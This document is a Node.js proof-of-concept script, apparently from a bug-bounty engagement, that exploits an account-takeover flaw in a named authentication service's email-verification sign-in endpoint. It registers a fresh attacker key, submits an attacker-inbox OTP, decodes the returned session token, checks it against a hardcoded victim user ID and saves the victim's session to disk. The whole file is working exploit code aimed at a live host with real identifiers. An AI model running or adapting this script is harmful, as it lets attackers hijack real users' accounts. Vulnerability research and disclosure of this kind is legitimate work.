#!/usr/bin/env node
// idor13b: PERSISTENCE PROOF — signin via attacker-attached email (ev6) with FRESH attacker key3
// No stolen session involved: pure attacker-inbox OTP -> session for VICTIM user = permanent backdoor
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');

const OUT = '/home/z/my-project/recon/idor13';
const API = 'https://app.dynamicauth.com/api/v0';
const ENV_SDK = 'fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9';
// UUID auto-parsed from latest create response (re-run idor13c_create.sh to mint a fresh one)
function loadUUID() {
  const raw = fs.readFileSync(`${OUT}/create_ev6_signin2.full`, 'utf8');
  return JSON.parse(raw.split('\nHTTPCODE:')[0]).verificationUUID;
}
const UUID = process.argv[3] || loadUUID();
const OTP = process.argv[2];
if (!OTP) { console.error('usage: node idor13b_persist.js <otp> [uuid]'); process.exit(1); }
console.log('    verificationUUID:', UUID);
const VICTIM_SUB = 'd0e3d92e-2377-44a3-921e-e30dca293a85';

// fresh attacker keypair key3
const kp = crypto.generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
fs.writeFileSync(`${OUT}/attacker_key3_priv.pem`, kp.privateKey.export({ format: 'pem', type: 'sec1' }));
const pubHex = kp.publicKey.export({ format: 'der', type: 'spki' }).toString('hex');
fs.writeFileSync(`${OUT}/attacker_key3_spki.hex`, pubHex);

function curl(method, url, body, headers) {
  const hh = Object.entries(headers || {}).map(([k, v]) => ['-H', `${k}: ${v}`]).flat();
  const args = ['-s', '-m', '25', '-w', '\n__HTTP__%{http_code}', '-X', method, url, ...hh];
  if (body) args.push('-d', body);
  const out = execSync(`curl ${args.map(a => `'${String(a).replace(/'/g, `'\\''`)}'`).join(' ')}`, { maxBuffer: 10e6 }).toString();
  const idx = out.lastIndexOf('__HTTP__');
  return { status: parseInt(out.slice(idx + 8).trim(), 10), body: out.slice(0, idx) };
}

console.log('[P1] POST emailVerifications/signin {ev6 UUID, OTP, attacker key3} — NO session token sent');
const r = curl('POST', `${API}/sdk/${ENV_SDK}/emailVerifications/signin`,
  JSON.stringify({ verificationUUID: UUID, verificationToken: OTP, sessionPublicKey: pubHex }),
  { 'Content-Type': 'application/json', 'X-Request-Purpose': 'Research', 'X-Bugcrowd-Ninja': 'zeno0' });
console.log('   ', r.status, r.body.slice(0, 300));
fs.writeFileSync(`${OUT}/p1_signin.full`, `${r.body}\nHTTPCODE:${r.status}`);

if (r.status === 200) {
  const d = JSON.parse(r.body);
  const claims = JSON.parse(Buffer.from(d.jwt.split('.')[1], 'base64url').toString());
  console.log('[P2] SESSION CLAIMS:');
  console.log('    sub (victim user?):', claims.sub, claims.sub === VICTIM_SUB ? '<-- VICTIM USER CONFIRMED' : '<-- different user');
  console.log('    email:', claims.email);
  console.log('    sid:', claims.sid, '(fresh session, attacker key3 registered)');
  console.log('    scope:', claims.scope);
  fs.writeFileSync(`${OUT}/p1_victim_session.jwt`, d.jwt);
  fs.writeFileSync(`${OUT}/p1_victim_session.mini`, d.minifiedJwt || '');
  console.log('[VERDICT] PERSISTENT TAKEOVER: attacker re-entered victim account via OWN inbox OTP, no stolen session needed');
} else {
  console.log('[VERDICT] signin did not yield victim session — check body above');
}
